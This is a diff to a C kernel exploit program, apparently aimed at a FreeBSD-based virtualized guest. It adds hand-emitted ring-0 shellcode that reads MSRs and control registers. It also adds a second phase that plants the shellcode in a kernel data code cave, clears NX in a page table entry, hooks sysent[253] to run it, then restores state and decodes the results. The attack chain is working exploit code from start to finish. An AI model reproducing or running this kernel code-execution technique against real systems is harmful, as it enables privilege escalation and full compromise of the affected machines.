@@ -1195,6 +1195,121 @@ static int build_msr_shellcode(uint8_t *buf, int bufmax, uint64_t output_kva) {
     return p;
 }
 
+/* ============================================================
+ * Build MSR/CR recon shellcode for SYSENT HOOK execution path
+ *
+ * Calling convention: int sys_foo(struct thread *td, void *uap)
+ *   - RDI = td (we ignore it)
+ *   - RSI = uap (we ignore it)
+ *   - Return via RET (not IRETQ)
+ *   - Caller-saved regs (RAX,RCX,RDX,RSI,RDI,R8-R11) can be clobbered
+ *   - Must preserve RBX,RBP,R12-R15
+ *
+ * Reads safe MSRs + APIC_BASE + CR0/CR3/CR4, writes results
+ * to kmod_result_buf format at output_kva.
+ * ============================================================ */
+static int build_ring0_msr_shellcode(uint8_t *buf, int bufmax,
+                                     uint64_t output_kva) {
+    int p = 0;
+
+    #define EMIT(b) do { if (p < bufmax) buf[p++] = (uint8_t)(b); } while(0)
+    #define EMIT_U32(v) do { uint32_t _v=(v); memcpy(&buf[p],&_v,4); p+=4; } while(0)
+    #define EMIT_U64(v) do { uint64_t _v=(v); memcpy(&buf[p],&_v,8); p+=8; } while(0)
+
+    /* No push/pop needed — sysent dispatch saves caller-saved regs.
+     * We only use RAX, RCX, RDX, RDI which are all caller-saved. */
+
+    /* movabs $output_kva, %rdi */
+    EMIT(0x48); EMIT(0xBF); EMIT_U64(output_kva);
+
+    /* Write magic: movabs $KMOD_MAGIC, %rax; mov %rax, (%rdi) */
+    EMIT(0x48); EMIT(0xB8); EMIT_U64(0xCAFEBABEDEAD1337ULL);
+    EMIT(0x48); EMIT(0x89); EMIT(0x07);
+
+    /* status = RUNNING: movl $1, 8(%rdi) */
+    EMIT(0xC7); EMIT(0x47); EMIT(0x08); EMIT_U32(1);
+
+    /* MSR/CR reading table — includes APIC_BASE for suspend/resume research */
+    static const struct { uint32_t id; int is_cr; } msr_table[] = {
+        { 0xC0000080, 0 },  /* EFER */
+        { 0xC0000081, 0 },  /* STAR */
+        { 0xC0000082, 0 },  /* LSTAR (syscall entry) */
+        { 0xC0000084, 0 },  /* SFMASK */
+        { 0xC0000100, 0 },  /* FS_BASE */
+        { 0xC0000101, 0 },  /* GS_BASE (per-CPU) */
+        { 0xC0000102, 0 },  /* KERNEL_GS_BASE */
+        { 0xC0000103, 0 },  /* TSC_AUX */
+        { 0x0000001B, 0 },  /* APIC_BASE (local APIC phys addr) */
+        { 0xFFFF0000, 1 },  /* CR0 (pseudo) */
+        { 0xFFFF0003, 1 },  /* CR3 (pseudo) */
+        { 0xFFFF0004, 1 },  /* CR4 (pseudo) */
+    };
+    int n_entries = sizeof(msr_table) / sizeof(msr_table[0]);
+
+    for (int i = 0; i < n_entries; i++) {
+        int32_t id_off  = 32 + i * 16;
+        int32_t val_off = 32 + i * 16 + 4;
+        int32_t dat_off = 32 + i * 16 + 8;
+
+        if (!msr_table[i].is_cr) {
+            /* mov $msr_num, %ecx */
+            EMIT(0xB9); EMIT_U32(msr_table[i].id);
+            /* rdmsr → EDX:EAX */
+            EMIT(0x0F); EMIT(0x32);
+            /* shl $32, %rdx */
+            EMIT(0x48); EMIT(0xC1); EMIT(0xE2); EMIT(0x20);
+            /* or %rdx, %rax */
+            EMIT(0x48); EMIT(0x09); EMIT(0xD0);
+        } else {
+            uint32_t cr = msr_table[i].id & 0xF;
+            /* mov %crN, %rax */
+            EMIT(0x0F); EMIT(0x20); EMIT(0xC0 + cr * 8);
+        }
+
+        /* Store msr_id: movl $id, disp(%rdi) */
+        if (id_off < 128) {
+            EMIT(0xC7); EMIT(0x47); EMIT((uint8_t)id_off);
+        } else {
+            EMIT(0xC7); EMIT(0x87); EMIT_U32(id_off);
+        }
+        EMIT_U32(msr_table[i].id);
+
+        /* Store valid=1: movl $1, disp(%rdi) */
+        if (val_off < 128) {
+            EMIT(0xC7); EMIT(0x47); EMIT((uint8_t)val_off);
+        } else {
+            EMIT(0xC7); EMIT(0x87); EMIT_U32(val_off);
+        }
+        EMIT_U32(1);
+
+        /* Store value: mov %rax, disp(%rdi) */
+        if (dat_off < 128) {
+            EMIT(0x48); EMIT(0x89); EMIT(0x47); EMIT((uint8_t)dat_off);
+        } else {
+            EMIT(0x48); EMIT(0x89); EMIT(0x87); EMIT_U32(dat_off);
+        }
+    }
+
+    /* num_msr_results = n_entries: movl $n, 24(%rdi) */
+    EMIT(0xC7); EMIT(0x47); EMIT(0x18); EMIT_U32((uint32_t)n_entries);
+
+    /* status = DONE: movl $2, 8(%rdi) */
+    EMIT(0xC7); EMIT(0x47); EMIT(0x08); EMIT_U32(2);
+
+    /* mfence */
+    EMIT(0x0F); EMIT(0xAE); EMIT(0xF0);
+
+    /* Return 0 (success) */
+    EMIT(0x31); EMIT(0xC0);  /* xor eax, eax */
+    EMIT(0xC3);               /* ret */
+
+    #undef EMIT
+    #undef EMIT_U32
+    #undef EMIT_U64
+
+    return p;
+}
+
 static void campaign_kmod_kldload(void) {
     printf("\n=============================================\n");
     printf("  Campaign 7: Kernel Module (kldload)\n");
@@ -3249,6 +3364,190 @@ ring3_fallback:
                        (unsigned long)sc_magic);
                 printf("[+] Attack chain: PTE NX-clear + sysent hook → ring 0\n");
                 printf("[+] We have arbitrary kernel code execution.\n");
+
+                /* ─── Phase 2: MSR/CR Reconnaissance via ring-0 ─── */
+                printf("\n=============================================\n");
+                printf("  Ring-0 Phase 2: MSR/CR Reconnaissance\n");
+                printf("=============================================\n\n");
+                fflush(stdout);
+
+                /* Build the MSR recon shellcode */
+                uint8_t msr_sc[512];
+                int msr_sc_len = build_ring0_msr_shellcode(msr_sc, sizeof(msr_sc),
+                                                           result_kva);
+                printf("[*] MSR recon shellcode: %d bytes\n", msr_sc_len);
+
+                if (msr_sc_len <= 0 || msr_sc_len > 480) {
+                    printf("[-] Shellcode too large or failed to build.\n");
+                } else {
+                    /* Clear the shared buffer for fresh results */
+                    uint8_t zero_buf[256];
+                    memset(zero_buf, 0, sizeof(zero_buf));
+                    for (int zb = 0; zb < KMOD_RESULT_ALLOC_SIZE; zb += 256)
+                        kernel_copyin(zero_buf, g_dmap_base + cpu_pa + zb, 256);
+
+                    /* Save original kdata content (larger region for MSR shellcode) */
+                    uint8_t msr_backup[512];
+                    kernel_copyout(g_dmap_base + target_pa, msr_backup, msr_sc_len);
+
+                    /* Write MSR shellcode to kdata code cave */
+                    printf("[*] Writing MSR shellcode to kdata code cave...\n");
+                    kernel_copyin(msr_sc, g_dmap_base + target_pa, msr_sc_len);
+
+                    /* Verify write */
+                    uint8_t msr_verify[512];
+                    kernel_copyout(g_dmap_base + target_pa, msr_verify, msr_sc_len);
+                    int msr_match = (memcmp(msr_sc, msr_verify, msr_sc_len) == 0);
+                    printf("    Write verify: %s\n", msr_match ? "OK" : "MISMATCH");
+                    fflush(stdout);
+
+                    if (msr_match) {
+                        /* Clear NX+G in PTE again */
+                        printf("[*] Clearing NX+G in PTE for MSR shellcode...\n");
+                        kernel_copyin(&new_pte, g_dmap_base + pte_pa, 8);
+
+                        /* Hook sysent[253] again */
+                        printf("[*] Hooking sysent[253] → kdata_base...\n");
+                        kernel_copyin(&target_kva, g_dmap_base + s253_call_pa, 8);
+                        kernel_copyin(&narg_zero, g_dmap_base + s253_narg_pa, 4);
+
+                        /* Execute MSR recon in ring 0 */
+                        printf("[*] Calling syscall(253) — MSR/CR recon in ring 0...\n");
+                        fflush(stdout);
+                        errno = 0;
+                        long msr_ret = syscall(253);
+                        int msr_err = errno;
+                        printf("    syscall(253) returned: %ld, errno=%d\n",
+                               msr_ret, msr_err);
+
+                        /* Restore everything immediately */
+                        printf("[*] Restoring PTE, sysent, code cave...\n");
+                        kernel_copyin(s253_orig, g_dmap_base + s253_pa, SYSENT_STRIDE);
+                        kernel_copyin(&orig_pte, g_dmap_base + pte_pa, 8);
+                        kernel_copyin(msr_backup, g_dmap_base + target_pa, msr_sc_len);
+                        printf("    All restored.\n");
+                        fflush(stdout);
+
+                        /* Parse results from shared buffer */
+                        struct kmod_result_buf msr_results;
+                        memcpy(&msr_results, result_vaddr, sizeof(msr_results));
+
+                        if (msr_results.magic == KMOD_MAGIC &&
+                            msr_results.status == KMOD_STATUS_DONE) {
+                            printf("\n[+] ============================================\n");
+                            printf("[+]  MSR/CR RECON COMPLETE — %u entries\n",
+                                   msr_results.num_msr_results);
+                            printf("[+] ============================================\n\n");
+
+                            for (uint32_t mi = 0;
+                                 mi < msr_results.num_msr_results && mi < 32;
+                                 mi++) {
+                                uint32_t mid = msr_results.msr_results[mi].msr_id;
+                                uint64_t mval = msr_results.msr_results[mi].value;
+                                const char *mname;
+                                switch (mid) {
+                                    case 0xC0000080: mname = "EFER"; break;
+                                    case 0xC0000081: mname = "STAR"; break;
+                                    case 0xC0000082: mname = "LSTAR"; break;
+                                    case 0xC0000084: mname = "SFMASK"; break;
+                                    case 0xC0000100: mname = "FS_BASE"; break;
+                                    case 0xC0000101: mname = "GS_BASE"; break;
+                                    case 0xC0000102: mname = "KGS_BASE"; break;
+                                    case 0xC0000103: mname = "TSC_AUX"; break;
+                                    case 0x0000001B: mname = "APIC_BASE"; break;
+                                    case 0xFFFF0000: mname = "CR0"; break;
+                                    case 0xFFFF0003: mname = "CR3"; break;
+                                    case 0xFFFF0004: mname = "CR4"; break;
+                                    default: mname = "???"; break;
+                                }
+                                printf("    %-12s (0x%08x) = 0x%016lx\n",
+                                       mname, mid, (unsigned long)mval);
+
+                                /* Decode important registers */
+                                if (mid == 0xC0000080) { /* EFER */
+                                    printf("      SCE=%d LME=%d LMA=%d NXE=%d SVME=%d "
+                                           "LMSLE=%d FFXSR=%d TCE=%d\n",
+                                           (int)(mval & 1),
+                                           (int)((mval >> 8) & 1),
+                                           (int)((mval >> 10) & 1),
+                                           (int)((mval >> 11) & 1),
+                                           (int)((mval >> 12) & 1),
+                                           (int)((mval >> 13) & 1),
+                                           (int)((mval >> 14) & 1),
+                                           (int)((mval >> 15) & 1));
+                                    if (mval & (1ULL << 12))
+                                        printf("      [!] SVME=1 — SVM enabled in guest!\n");
+                                    else
+                                        printf("      [*] SVME=0 — SVM disabled (expected in guest)\n");
+                                }
+                                if (mid == 0xC0000082) { /* LSTAR */
+                                    printf("      Syscall entry point (ring 0)\n");
+                                    if (g_ktext_base && mval >= g_ktext_base &&
+                                        mval < g_ktext_base + 0x1000000)
+                                        printf("      ktext offset: +0x%lx\n",
+                                               (unsigned long)(mval - g_ktext_base));
+                                }
+                                if (mid == 0x1B) { /* APIC_BASE */
+                                    printf("      APIC PA=0x%lx BSP=%d EN=%d EXTD=%d\n",
+                                           (unsigned long)(mval & 0xFFFFF000ULL),
+                                           (int)((mval >> 8) & 1),
+                                           (int)((mval >> 11) & 1),
+                                           (int)((mval >> 10) & 1));
+                                }
+                                if (mid == 0xFFFF0000) { /* CR0 */
+                                    printf("      PE=%d MP=%d EM=%d TS=%d ET=%d "
+                                           "NE=%d WP=%d AM=%d NW=%d CD=%d PG=%d\n",
+                                           (int)(mval & 1),
+                                           (int)((mval >> 1) & 1),
+                                           (int)((mval >> 2) & 1),
+                                           (int)((mval >> 3) & 1),
+                                           (int)((mval >> 4) & 1),
+                                           (int)((mval >> 5) & 1),
+                                           (int)((mval >> 16) & 1),
+                                           (int)((mval >> 18) & 1),
+                                           (int)((mval >> 29) & 1),
+                                           (int)((mval >> 30) & 1),
+                                           (int)((mval >> 31) & 1));
+                                }
+                                if (mid == 0xFFFF0004) { /* CR4 */
+                                    printf("      VME=%d PVI=%d TSD=%d DE=%d "
+                                           "PSE=%d PAE=%d MCE=%d PGE=%d\n",
+                                           (int)(mval & 1),
+                                           (int)((mval >> 1) & 1),
+                                           (int)((mval >> 2) & 1),
+                                           (int)((mval >> 3) & 1),
+                                           (int)((mval >> 4) & 1),
+                                           (int)((mval >> 5) & 1),
+                                           (int)((mval >> 6) & 1),
+                                           (int)((mval >> 7) & 1));
+                                    printf("      OSFXSR=%d OSXMMEX=%d UMIP=%d "
+                                           "FSGSBASE=%d PCIDE=%d OSXSAVE=%d SMEP=%d SMAP=%d\n",
+                                           (int)((mval >> 9) & 1),
+                                           (int)((mval >> 10) & 1),
+                                           (int)((mval >> 11) & 1),
+                                           (int)((mval >> 16) & 1),
+                                           (int)((mval >> 17) & 1),
+                                           (int)((mval >> 18) & 1),
+                                           (int)((mval >> 20) & 1),
+                                           (int)((mval >> 21) & 1));
+                                }
+                            }
+                            printf("\n");
+                        } else if (msr_results.magic == KMOD_MAGIC) {
+                            printf("[?] MSR recon started but didn't complete "
+                                   "(status=%u)\n", msr_results.status);
+                            printf("    Likely #GP on an MSR read — HV intercept.\n");
+                        } else {
+                            printf("[-] MSR shellcode did not write magic.\n");
+                            if (msr_err != 0)
+                                printf("    errno=%d — possible #GP fault.\n", msr_err);
+                        }
+                    } else {
+                        /* Write failed — restore kdata */
+                        printf("[-] MSR shellcode write verify failed.\n");
+                        kernel_copyin(msr_backup, g_dmap_base + target_pa, msr_sc_len);
+                    }
+                }
             } else if (buf_check != 0) {
                 printf("[?] Buffer has unexpected value: 0x%lx\n",
                        (unsigned long)buf_check);
